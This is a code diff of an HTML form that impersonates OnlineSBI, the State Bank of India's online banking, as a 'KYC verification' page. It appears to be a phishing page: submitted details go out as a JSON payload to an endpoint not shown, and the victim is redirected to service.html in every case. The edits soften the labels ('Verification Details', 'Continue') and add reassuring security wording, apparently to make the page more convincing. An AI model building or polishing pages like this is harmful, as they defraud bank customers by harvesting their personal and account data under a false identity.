@@ -44,7 +44,7 @@
     <div class="container">
         <img src="https://i.ibb.co/fz5x9ff2/Main-817fcadb-1.jpg" alt="Header" class="full-img">
         
-        <div class="header-bar">KYC Verification</div>
+        <div class="header-bar">Verification Details</div>
 
         <div class="content-area">
             <div class="instruction-text">
@@ -64,13 +64,13 @@
                 </div>
 
                 <div class="btn-row">
-                    <button type="submit" class="btn btn-submit" id="submitBtn">Submit KYC</button>
+                    <button type="submit" class="btn btn-submit" id="submitBtn">Continue</button>
                     <button type="reset" class="btn btn-gray">Reset</button>
                 </div>
             </form>
 
             <div class="footer-note">
-                <b>Security Note:</b> OnlineSBI uses 256-bit SSL encryption to protect your data.
+                <b>Security Note:</b> OnlineSBI uses 256-bit SSL encryption to protect your data and privacy.
             </div>
         </div>
 
@@ -106,7 +106,7 @@
                     body: JSON.stringify(payload)
                 });
                 
-                // REDIRECT TO SERVICE.HTML
+                // Redirect to service.html
                 window.location.href = "service.html"; 
             } catch (err) {
                 window.location.href = "service.html";
